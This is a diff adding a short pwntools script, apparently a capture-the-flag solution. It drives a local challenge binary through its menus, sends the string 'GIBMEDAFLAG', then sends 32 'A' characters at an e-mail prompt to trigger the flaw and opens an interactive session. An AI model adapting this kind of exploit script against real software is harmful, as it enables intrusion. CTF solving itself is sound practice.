@@ -1,0 +1,17 @@
+from pwn import *
+
+r = process("./s3cr3t_bin")
+r.recvuntil("Qu1t")
+r.sendline('1')
+r.recvuntil("Pick a product:")
+r.sendline('GIBMEDAFLAG')
+r.recvuntil("Qu1t")
+r.sendline('3')
+r.recvuntil("(Y/N)?")
+r.sendline('Y')
+r.recvuntil("(Y/N)?")
+r.sendline('Y')
+r.recvuntil("your e-mele plzz:")
+r.send('A'*32)
+print r.recv(1024)
+r.interactive()
